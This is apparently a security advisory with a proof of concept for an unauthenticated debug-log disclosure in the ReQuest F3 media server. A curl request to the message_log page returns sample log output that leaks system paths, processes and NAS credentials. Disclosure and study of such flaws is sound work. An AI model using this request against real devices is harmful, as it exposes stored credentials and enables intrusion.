@@ -1,0 +1,76 @@
+# Exploit Title: ReQuest Serious Play F3 Media Server 7.0.3 - Debug Log Disclosure
+# Exploit Author: LiquidWorm
+# Software Link: http://request.com/
+# Version: 3.0.0
+
+ReQuest Serious Play F3 Media Server 7.0.3 Debug Log Disclosure
+
+
+Vendor: ReQuest Serious Play LLC
+Product web page: http://www.request.com
+Affected version: 7.0.3.4968 (Pro)
+                  7.0.2.4954
+                  6.5.2.4954
+                  6.4.2.4681
+                  6.3.2.4203
+                  2.0.1.823
+
+Summary: F3 packs all the power of ReQuest's multi-zone serious Play servers
+into a compact powerhouse. With the ability to add unlimited NAS devices, the
+F3 can handle your entire family's media collection with ease.
+
+Desc: The unprotected web management server is vulnerable to sensitive information
+disclosure vulnerability. An unauthenticated attacker can visit the message_log
+page and disclose the webserver's Python debug log file containing system information,
+credentials, paths, processes and command arguments running on the device.
+
+Tested on: ReQuest Serious Play® OS v7.0.1
+           ReQuest Serious Play® OS v6.0.0
+           Debian GNU/Linux 5.0
+           Linux 3.2.0-4-686-pae
+           Linux 2.6.36-request+lenny.5
+           Apache/2.2.22
+           Apache/2.2.9
+           PHP/5.4.45
+           PHP/5.2.6-1
+
+
+Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
+Macedonian Information Security Research and Development Laboratory
+Zero Science Lab - https://www.zeroscience.mk - @zeroscience
+
+
+Advisory ID: ZSL-2020-5600
+Advisory URL: https://www.zeroscience.mk/en/vulnerabilities/ZSL-2020-5600.php
+
+
+01.08.2020
+
+--
+
+
+$ curl http://192.168.1.17/message_log
+
+...
+...
+Oct 14 09:17:05 [debug] mediaman[pid 3635, tid -1590039696]: (mediaman.py/11576) Message Response (mrespgetdir): /MP3/NAS000000001/.request/upload
+Oct 14 09:17:05 [debug] mediaman[pid 3635, tid -1581646992]: (mediaman.py/11576) Message Response (mrespgetdir): /MP3/NAS000000002/.request/upload
+Oct 14 09:17:06 [debug] mediaman[pid 3635, tid -1403303056]: (mediaman.py/11576) Message Response (mrespgetdir): /MP3/NAS000000003/.request/upload
+Oct 14 09:17:06 [debug] mediaman[pid 3635, tid -1610613904]: (mediaman.py/11576) Message Response (mrespgetdir): /fat32/c/upload
+Oct 14 09:17:06 [debug] mediaman[pid 3635, tid -1619006608]: (mediaman.py/11576) Message Response (mrespgetdir): Failed - no such directory
+Oct 14 09:17:06 [debug] mediaman[pid 3635, tid -1285805200]: (mediaman.py/11576) Message Response (mrespgetdir): /MP3/NAS000000001/.request/upload
+Oct 14 09:17:36 [debug] discodaemon[pid 3635, tid -1294197904]: (discodaemon.py/3110) Mount NAS: /home/arq/bin/mountnas.py -n 3 '192.168.1.17' 'Movies' -u 'admin' -p 'zePassw0rd' 2>/dev/null
+Oct 14 09:17:48 [debug] discodaemon[pid 3635, tid -1294197904]: (discodaemon.py/3113) Mount NAS verify: df /MP3/NAS000000003 2>/dev/null
+Oct 14 09:19:19 [debug] discodaemon[pid 3635, tid -1294197904]: (discodaemon.py/3110) Mount NAS: /home/arq/bin/mountnas.py -n 3 '192.168.1.17' 'Movies' -u 'admin' -p 'zePassw0rd' 2>/dev/null
+Oct 14 09:19:32 [debug] discodaemon[pid 3635, tid -1294197904]: (discodaemon.py/3113) Mount NAS verify: df /MP3/NAS000000003 2>/dev/null
+Oct 14 09:20:25 [debug] scheduler[pid 12089, tid -1285543056]: (schedule.py/177) Spawning a command at 1602681625.397037 ('Update News Feed'): /home/arq/bin/widget/news_feed.py
+Oct 14 09:20:25 [debug] scheduler[pid 12089, tid -1285543056]: (schedule.py/177) Spawning a command at 1602681625.401558 ('Update Stock Feed'): /home/arq/bin/widget/stock_feed.py
+Oct 14 09:20:25 [debug] scheduler[pid 12089, tid -1285543056]: (schedule.py/181) Skipping a command ('Check if squeezeplay was properly started'); condition doesn't match
+Oct 14 09:20:25 [debug] scheduler[pid 12089, tid -1285543056]: (schedule.py/177) Spawning a command at 1602681625.408094 ('Probe for CP2101'): /home/arq/bin/cp2101_probe.sh
+Oct 14 09:20:25 [debug] scheduler[pid 12089, tid -1285543056]: (schedule.py/177) Spawning a command at 1602681625.409664 ('Update Weather Feed'): /home/arq/bin/widget/weather_feed.py
+Oct 14 09:20:25 [debug] scheduler[pid 12089, tid -1285543056]: (schedule.py/177) Spawning a command at 1602681625.413391 ('Check for Network Configuration changes'): /home/arq/bin/check_netconf.sh
+Oct 14 09:20:25 [warning] BrowserProtocolClient_15[pid 11532, tid -1544549520]: (pandoralist.py/282) No Pandora user configured.
+Oct 14 09:20:35 [debug] scheduler[pid 12089, tid -1285543056]: (schedule.py/177) Spawning a command at 1602681635.425757 ('Ask all currently-attached IMCs to answer a rollcall'): /home/arq/bin/imcRollcall.sh
+Oct 14 09:20:35 [debug] ini[pid 12089, tid -1251767440]: (iniengine.py/621) Setting MPP30345_STATUS:Rollcall to 1602681635.45
+...
+...
